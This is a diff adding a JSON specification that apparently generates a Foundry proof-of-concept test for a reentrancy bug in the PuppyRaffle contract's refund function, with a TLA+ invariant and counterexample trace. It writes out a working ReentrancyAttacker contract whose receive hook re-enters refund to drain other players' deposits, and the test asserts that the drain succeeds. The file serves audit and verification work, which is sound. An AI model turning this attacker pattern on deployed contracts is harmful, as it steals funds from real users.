@@ -1,0 +1,62 @@
+{
+  "shape": "ReentrancyDrain",
+  "tla_spec_path": "docs/tla/ReentrancyDrain.tla",
+  "invariant": "ClaimedAtMostOnce",
+  "target": {
+    "path": "src/PuppyRaffle.sol",
+    "contract": "PuppyRaffle",
+    "target_fn": "refund",
+    "pragma": "^0.7.6"
+  },
+  "state_vars": [
+    "ReentrancyAttacker public attacker;",
+    "uint256 constant ENTRANCE_FEE = 1 ether;"
+  ],
+  "attacker_contract": {
+    "name": "ReentrancyAttacker",
+    "constructor_args": "PuppyRaffle _v",
+    "fields": [
+      "PuppyRaffle public victim;",
+      "uint256 public attackArg;",
+      "uint256 public callsRemaining;",
+      "uint256 public callsExecuted;"
+    ],
+    "constructor_body": "victim = _v;",
+    "trigger_fn": {
+      "name": "attack",
+      "args": "uint256 _attackArg, uint256 _callDepth",
+      "body": "attackArg = _attackArg; callsRemaining = _callDepth; callsExecuted = 0; victim.refund(_attackArg);"
+    },
+    "receive_body": "if (callsRemaining > 0) { callsRemaining--; callsExecuted++; victim.refund(attackArg); }"
+  },
+  "setup_block": [
+    "victim = new PuppyRaffle(ENTRANCE_FEE, address(0xBEEF), 1 weeks);",
+    "attacker = new ReentrancyAttacker(victim);",
+    "address[] memory players = new address[](1); players[0] = address(attacker);",
+    "vm.deal(address(attacker), 100 ether);",
+    "vm.prank(address(attacker)); victim.enterRaffle{value: ENTRANCE_FEE}(players);",
+    "address[] memory honest = new address[](3); honest[0] = address(0x1); honest[1] = address(0x2); honest[2] = address(0x3);",
+    "vm.deal(address(this), 10 ether);",
+    "victim.enterRaffle{value: ENTRANCE_FEE * 3}(honest);"
+  ],
+  "trace_replay_block": [
+    "uint256 victimBefore = address(victim).balance;",
+    "uint256 attackerBefore = address(attacker).balance;",
+    "vm.prank(address(attacker)); attacker.attack(0, 1);",
+    "uint256 victimAfter = address(victim).balance;",
+    "uint256 attackerAfter = address(attacker).balance;",
+    "emit log_named_uint('victim drained', victimBefore - victimAfter);",
+    "emit log_named_uint('attacker gained', attackerAfter - attackerBefore);"
+  ],
+  "invariant_assert_block": [
+    "assertGt(attacker.callsExecuted(), 0, 'ClaimedAtMostOnce: attacker must have re-entered at least once');",
+    "assertGt(address(attacker).balance, ENTRANCE_FEE, 'ClaimedAtMostOnce VIOLATED: attacker walked away with > 1 ENTRANCE_FEE');"
+  ],
+  "tlc_trace_head": [
+    "State 0: slot=Live, paid=0, reentries=0",
+    "  Action: PreCheckBuggy(e)",
+    "State 1: slot=Calling, paid=TicketPrice, reentries=1",
+    "  Action: ReenterBuggy(e)",
+    "State 2: slot=Calling, paid=2*TicketPrice, reentries=2  -- INVARIANT VIOLATED"
+  ]
+}
